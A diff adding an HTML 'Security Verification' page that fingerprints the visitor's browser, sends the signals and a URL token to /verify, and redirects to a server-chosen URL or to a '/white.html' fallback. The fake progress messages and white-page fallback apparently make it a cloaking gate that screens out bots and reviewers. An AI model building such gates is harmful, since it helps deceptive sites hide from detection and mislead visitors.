@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            text-align: center;
+            max-width: 500px;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        p {
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 2s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .progress {
+            width: 100%;
+            height: 20px;
+            background-color: #f0f0f0;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+        .status {
+            color: #333;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Security Verification</h1>
+        <p>We're performing a quick security check to ensure the safety of our platform.</p>
+        <div class="spinner"></div>
+        <div class="progress">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <div class="status" id="status">Initializing...</div>
+    </div>
+
+    <script>
+        let mouseMovements = 0;
+        let startTime = Date.now();
+        let progressInterval;
+        let currentProgress = 0;
+
+        // Get token from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const token = urlParams.get('token');
+
+        if (!token) {
+            window.location.href = '/white.html';
+        }
+
+        // Track mouse movements
+        document.addEventListener('mousemove', function() {
+            mouseMovements++;
+        });
+
+        // Collect browser signals
+        function collectSignals() {
+            const signals = {
+                webdriver: navigator.webdriver || false,
+                screen_width: screen.width,
+                screen_height: screen.height,
+                timezone_offset: new Date().getTimezoneOffset(),
+                mouse_movements: mouseMovements,
+                touch_support: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+                user_agent: navigator.userAgent,
+                cookies_enabled: navigator.cookieEnabled,
+                language: navigator.language,
+                platform: navigator.platform,
+                hardware_concurrency: navigator.hardwareConcurrency || 0,
+                device_memory: navigator.deviceMemory || 0,
+                connection_type: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+                time_spent: Date.now() - startTime
+            };
+
+            return signals;
+        }
+
+        // Update progress bar
+        function updateProgress() {
+            const statusElement = document.getElementById('status');
+            const progressBar = document.getElementById('progressBar');
+            
+            if (currentProgress < 30) {
+                statusElement.textContent = 'Analyzing browser...';
+            } else if (currentProgress < 60) {
+                statusElement.textContent = 'Checking security features...';
+            } else if (currentProgress < 90) {
+                statusElement.textContent = 'Verifying authenticity...';
+            } else {
+                statusElement.textContent = 'Almost done...';
+            }
+            
+            progressBar.style.width = currentProgress + '%';
+            currentProgress += Math.random() * 10 + 5;
+            
+            if (currentProgress >= 100) {
+                clearInterval(progressInterval);
+                progressBar.style.width = '100%';
+                statusElement.textContent = 'Verification complete!';
+                setTimeout(performVerification, 500);
+            }
+        }
+
+        // Perform verification
+        function performVerification() {
+            const signals = collectSignals();
+            
+            fetch('/verify', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    token: token,
+                    signals: signals
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.action === 'allow' && data.redirect) {
+                    window.location.href = data.redirect;
+                } else {
+                    window.location.href = '/white.html';
+                }
+            })
+            .catch(error => {
+                console.error('Verification error:', error);
+                window.location.href = '/white.html';
+            });
+        }
+
+        // Start the verification process
+        setTimeout(() => {
+            progressInterval = setInterval(updateProgress, 200 + Math.random() * 300);
+        }, 1000);
+
+        // Fallback timeout
+        setTimeout(() => {
+            if (currentProgress < 100) {
+                clearInterval(progressInterval);
+                performVerification();
+            }
+        }, 8000);
+    </script>
+</body>
+</html>
